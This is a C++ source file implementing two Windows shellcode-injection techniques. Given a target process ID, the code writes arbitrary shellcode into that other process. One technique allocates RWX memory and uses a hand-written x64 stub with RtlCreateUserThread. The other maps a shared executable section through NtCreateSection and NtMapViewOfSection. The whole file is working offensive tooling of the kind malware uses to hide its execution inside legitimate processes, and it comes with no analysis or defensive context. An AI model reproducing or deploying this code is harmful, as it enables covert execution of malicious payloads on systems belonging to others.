#include "Technique.h"
#include "Util.h"

BOOL InjectThreadpoolWait(const std::vector<unsigned char>& shellcode, DWORD targetPid)
{
    std::cout << "Using technique 1: Shellcode Execution via CreateThreadpoolWait" << std::endl;
    HANDLE hProcess = NULL, hThread = NULL;
    LPVOID remoteMemory = NULL;
    LPVOID stubMemory = NULL;
    LPVOID paramMemory = NULL;
    ThreadpoolParams params;
    bool result = false;

    unsigned char stubBytes[] = {
        0x56,
        0x57,
        0x48, 0x83, 0xEC, 0x28,
        0x48, 0x89, 0xCE,
        0x48, 0x8B, 0x0E,
        0x48, 0x31, 0xD2,
        0x4D, 0x31, 0xC0,
        0x48, 0x8B, 0x46, 0x08,
        0xFF, 0xD0,
        0x48, 0x89, 0xC1,
        0x48, 0x8B, 0x46, 0x10,
        0xFF, 0xD0,
        0x48, 0x83, 0xC4, 0x28,
        0x5F,
        0x5E,
        0xC3
    };

    {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
        if (!hProcess)
        {
            std::cerr << "OpenProcess Failed" << GetLastError() << std::endl;
            goto cleanup;
        }
        LPVOID localBase = GetModuleHandleA("kernel32.dll");
        LPVOID remoteBase = GetRemoteModuleBase(hProcess, "kernel32.dll");

        if (!remoteBase)
        {
            std::cerr << "Failed to get remote kernerl32 base" << std::endl;
            goto cleanup;
        }

        remoteMemory = VirtualAllocEx(hProcess, NULL, shellcode.size(),
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteMemory)
        {
            std::cerr << "VirtualAllocEx Failed" << std::endl;
            goto cleanup;
        }

        if (!WriteProcessMemory(hProcess, remoteMemory, shellcode.data(), shellcode.size(), NULL))
        {
            std::cerr << "WriteProcessMemory Failed" << std::endl;
            goto cleanup;
        }

        DWORD offset1 = (DWORD)((uintptr_t)GetProcAddress((HMODULE)localBase, "CreateThreadpoolWork") - (uintptr_t)localBase);
        DWORD offset2 = (DWORD)((uintptr_t)GetProcAddress((HMODULE)localBase, "SubmitThreadpoolWork") - (uintptr_t)localBase);

        params.shellcodeAddr = remoteMemory;
        params.pCreateThreadpoolWork = (LPVOID)((uintptr_t)remoteBase + offset1);
        params.pSubmitThreadpoolWork = (LPVOID)((uintptr_t)remoteBase + offset2);

        paramMemory = VirtualAllocEx(hProcess, NULL, sizeof(params), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!paramMemory)
        {
            std::cerr << "VirtualAllocEx paramMemory failed" << std::endl;
            goto cleanup;
        }

        if (!WriteProcessMemory(hProcess, paramMemory, &params, sizeof(params), NULL))
        {
            std::cerr << "WriteProcessMemory paramMemory failed" << GetLastError() << std::endl;
            goto cleanup;
        }

        stubMemory = VirtualAllocEx(hProcess, NULL, sizeof(stubBytes), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!stubMemory)
        {
            std::cerr << "VirtualAllocEx Failed " << GetLastError() << std::endl;
            goto cleanup;
        }

        if (!WriteProcessMemory(hProcess, stubMemory, stubBytes, sizeof(stubBytes), NULL))
        {
            std::cerr << "WriteProcessMemory Failed" << GetLastError() << std::endl;
            goto cleanup;
        }

        myRtlCreateUserThread fRtlCreateUserThread =
            (myRtlCreateUserThread)(GetProcAddress(GetModuleHandleA("ntdll"), "RtlCreateUserThread"));
        NTSTATUS status = fRtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, stubMemory, paramMemory, &hThread, NULL);
        if (status < 0)
        {
            std::cerr << "fRtlCreateUserThread Failed" << std::endl;
            goto cleanup;
        }

        std::cout << "Remote Threadpool Wait Triggered!" << std::endl;
        result = true;
    }

cleanup:
    if (hThread) CloseHandle(hThread);
    if (hProcess) CloseHandle(hProcess);
    return result;
}

BOOL InjectSectionMapping(const std::vector<unsigned char>& shellcode, DWORD targetPid)
{
    std::cout << "Using technique 2: Shellcode Execution via Section Mapping" << std::endl;

    myNtCreateSection fNtCreateSection = (myNtCreateSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateSection"));
    myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection"));
    myRtlCreateUserThread fRtlCreateUserThread = (myRtlCreateUserThread)(GetProcAddress(GetModuleHandleA("ntdll"), "RtlCreateUserThread"));

    if (!fNtCreateSection || !fNtMapViewOfSection || !fRtlCreateUserThread) return false;

    HANDLE hProcess = NULL, hSection = NULL, hThread = NULL;
    PVOID localAddress = NULL, remoteAddress = NULL;
    bool result = false;

    {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
        if (!hProcess)
        {
            std::cerr << "OpenProcess Failed" << GetLastError() << std::endl;
            goto cleanup;
        }

        SIZE_T size = shellcode.size();
        LARGE_INTEGER sectionSize = { (LONGLONG)size };

        // create a memory section
        NTSTATUS status = fNtCreateSection(&hSection,
            SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL,
            (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
        if (status < 0)
        {
            std::cerr << "NtCreateSection Failed" << GetLastError() << std::endl;
            goto cleanup;
        }

        // create a view of the memory section in the local process
        SIZE_T viewSize = 0;

        //Load into Local
        status = fNtMapViewOfSection(hSection, GetCurrentProcess(),
            &localAddress, NULL, NULL, NULL, &viewSize, 2, NULL, PAGE_READWRITE);
        if (status < 0)
        {
            std::cerr << "Local Map Failed" << GetLastError() << std::endl;
            goto cleanup;
        }

        //Load into Remote
        status = fNtMapViewOfSection(hSection, hProcess,
            &remoteAddress, NULL, NULL, NULL, &viewSize, 2, NULL, PAGE_EXECUTE_READWRITE);
        if (status < 0)
        {
            std::cerr << "Remote Map Failed" << GetLastError() << std::endl;
            goto cleanup;
        }

        memcpy(localAddress, shellcode.data(), size);

        status = fRtlCreateUserThread(hProcess, NULL, FALSE,
            0, 0, 0, remoteAddress, NULL, &hThread, NULL);
        if (status < 0)
        {
            std::cerr << "RtlCreateUserThread Failed" << GetLastError() << std::endl;
            goto cleanup;
        }
        if (hThread)
        {
            WaitForSingleObject(hThread, INFINITE);
        }
        return true;
    }

cleanup:
    if (hSection) CloseHandle(hSection);
    if (hThread) CloseHandle(hThread);
    if (hProcess) CloseHandle(hProcess);
    return result;
}